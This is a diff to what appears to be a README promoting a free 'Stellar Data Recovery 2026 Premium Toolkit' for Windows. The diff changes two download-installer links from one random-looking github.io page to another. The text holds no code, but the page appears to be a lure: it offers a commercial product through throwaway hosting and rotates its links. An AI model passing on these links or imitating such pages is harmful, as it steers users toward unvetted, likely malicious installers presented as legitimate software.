@@ -2,7 +2,7 @@
 
 Stellar Data Recovery 2026 Premium Toolkit is a comprehensive, all-in-one solution designed to retrieve lost, deleted, or inaccessible data from your Windows PC. This powerful package provides everything you need for a full recovery process, supporting a wide range of storage devices and file systems. Whether you've lost files due to accidental deletion, formatting, partition loss, or system corruption, this toolkit aims to restore them efficiently.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -56,7 +56,7 @@ Here are answers to some common queries about the toolkit.
 
 To get the latest version of the Stellar Data Recovery Premium Toolkit, please visit the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 *
 *This toolkit is provided for educational and personal data recovery purposes. Ensure you have the legal right to recover data from the target storage device.*
